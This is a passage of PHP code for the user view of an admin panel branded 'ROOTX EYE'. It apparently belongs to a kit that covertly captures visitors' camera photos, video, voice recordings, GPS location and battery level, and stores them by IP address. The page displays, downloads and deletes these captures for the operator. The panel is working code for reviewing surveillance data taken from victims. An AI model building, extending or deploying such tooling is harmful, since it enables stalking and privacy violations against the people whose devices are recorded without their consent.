// ==================== VIEW USER PAGE ====================
if (isset($_GET['view_user'])) {
    $view_ip = $_GET['view_user'];
    $user = $users[$view_ip] ?? null;
    
    if (!$user) {
        header('Location: admin.php');
        exit;
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>User Data - ROOTX EYE</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body { background:#0a0a1a; font-family:'Segoe UI',sans-serif; color:#fff; padding:20px; }
            .container { max-width:1200px; margin:0 auto; }
            .header { background:linear-gradient(135deg,#1a0033,#33001a); padding:20px 30px; border-radius:15px; margin-bottom:30px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; }
            .header h1 { font-size:28px; background:linear-gradient(45deg,#ff0033,#ff0066); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
            .btn-back { background:#3498db; color:#fff; padding:8px 20px; border:none; border-radius:8px; cursor:pointer; text-decoration:none; font-weight:bold; }
            .filters { display:flex; gap:12px; margin-bottom:25px; flex-wrap:wrap; align-items:center; }
            .filters select { padding:8px 16px; background:rgba(255,255,255,0.05); border:1px solid #333; border-radius:8px; color:#fff; }
            .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:20px; }
            .card { background:rgba(255,255,255,0.03); border-radius:14px; overflow:hidden; border:1px solid rgba(255,255,255,0.06); }
            .card .preview { width:100%; height:200px; background:#0d0d20; display:flex; justify-content:center; align-items:center; font-size:50px; overflow:hidden; position:relative; }
            .card .preview img { width:100%; height:100%; object-fit:cover; }
            .card .preview video { width:100%; height:100%; object-fit:cover; }
            .card .info { padding:14px 16px; }
            .card .info .time { color:#666; font-size:12px; }
            .card .info .ip { color:#888; font-size:12px; }
            .card .info .battery { font-size:12px; }
            .card .actions { padding:10px 16px; background:rgba(255,255,255,0.02); display:flex; gap:10px; border-top:1px solid rgba(255,255,255,0.03); }
            .card .actions a { padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; }
            .card .actions a:hover { opacity:0.8; }
            .btn-download { background:#00b894; color:#fff; }
            .btn-delete { background:#e74c3c; color:#fff; }
            .badge { display:inline-block; padding:2px 10px; border-radius:20px; font-size:10px; font-weight:bold; text-transform:uppercase; color:#fff; }
            .badge.photo { background:#00b894; }
            .badge.video { background:#9b59b6; }
            .badge.voice { background:#f39c12; }
            .badge.location { background:#3498db; }
            .empty { text-align:center; padding:60px 20px; color:#555; grid-column:1/-1; }
            @media (max-width:600px) { .header { flex-direction:column; text-align:center; gap:15px; } .grid { grid-template-columns:1fr; } }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div>
                    <h1>👤 IP: <?= htmlspecialchars($user['ip']) ?></h1>
                    <div style="color:#666; font-size:13px;">📅 First seen: <?= htmlspecialchars($user['first_seen'] ?? 'N/A') ?></div>
                </div>
                <a href="admin.php" class="btn-back">🔙 Back</a>
            </div>
            
            <div class="filters">
                <select id="filterType" onchange="filterCards()">
                    <option value="all">📋 All Types</option>
                    <option value="photo">📷 Photo</option>
                    <option value="video">🎥 Video</option>
                    <option value="voice">🎤 Voice</option>
                    <option value="location">📍 Location</option>
                </select>
            </div>

            <div class="grid" id="cardGrid">
                <?php if (empty($user['captures'])): ?>
                    <div class="empty">No captures for this user.</div>
                <?php else: ?>
                    <?php foreach (array_reverse($user['captures']) as $index => $capture): ?>
                    <div class="card" data-type="<?= $capture['type'] ?? 'unknown' ?>">
                        <div class="preview">
                            <?php 
                            $type = $capture['type'] ?? 'unknown';
                            $file = $capture['file'] ?? '';
                            ?>
                            <?php if ($type == 'photo' && !empty($file) && file_exists($file)): ?>
                                <img src="<?= $file ?>" alt="Photo">
                            <?php elseif ($type == 'video' && !empty($file) && file_exists($file)): ?>
                                <video src="<?= $file ?>" muted></video>
                            <?php elseif ($type == 'voice' && !empty($file) && file_exists($file)): ?>
                                <div style="text-align:center; padding:20px; width:100%;">
                                    <div style="font-size:50px;">🎤</div>
                                    <audio controls style="width:90%; margin-top:10px;">
                                        <source src="<?= $file ?>" type="audio/mpeg">
                                    </audio>
                                </div>
                            <?php elseif ($type == 'location'): ?>
                                <div style="text-align:center; padding:20px;">
                                    <div style="font-size:40px;">📍</div>
                                    <div style="font-size:14px; color:#aaa; margin-top:10px;">
                                        Lat: <?= $capture['lat'] ?? 'N/A' ?><br>
                                        Lng: <?= $capture['lng'] ?? 'N/A' ?>
                                    </div>
                                    <a href="https://maps.google.com/?q=<?= $capture['lat'] ?? '' ?>,<?= $capture['lng'] ?? '' ?>" target="_blank" style="color:#3498db; font-size:12px;">🗺️ View Map</a>
                                </div>
                            <?php else: ?>
                                <div style="text-align:center; padding:20px;">
                                    <div style="font-size:40px; color:#555;">❓</div>
                                    <div style="font-size:12px; color:#666;">Type: <?= htmlspecialchars($type) ?></div>
                                </div>
                            <?php endif; ?>
                            <span class="badge <?= $type ?>" style="position:absolute;top:10px;right:10px;">
                                <?= htmlspecialchars($type) ?>
                            </span>
                        </div>
                        <div class="info">
                            <div class="time">🕐 <?= htmlspecialchars($capture['time'] ?? 'N/A') ?></div>
                            <div class="ip">🌐 IP: <?= htmlspecialchars($capture['ip'] ?? 'N/A') ?></div>
                            <?php if (isset($capture['battery']) && $capture['battery'] !== null): ?>
                                <div class="battery">🔋 Battery: <?= round($capture['battery']) ?>%</div>
                            <?php endif; ?>
                        </div>
                        <div class="actions">
                            <?php if ($type != 'location' && !empty($file) && file_exists($file)): ?>
                                <a href="?download=<?= $index ?>&user=<?= urlencode($user['ip']) ?>" class="btn-download">⬇️ Download</a>
                            <?php endif; ?>
                            <a href="?delete=<?= $index ?>&user=<?= urlencode($user['ip']) ?>" class="btn-delete" onclick="return confirm('Delete this capture?')">🗑️ Delete</a>
                        </div>
                    </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
        <script>
            function filterCards() {
                const filter = document.getElementById('filterType').value;
                const cards = document.querySelectorAll('.card');
                cards.forEach(card => {
                    const type = card.dataset.type;
                    card.style.display = (filter === 'all' || type === filter) ? 'block' : 'none';
                });
            }
        </script>
    </body>
    </html>
    <?php
    exit;
}
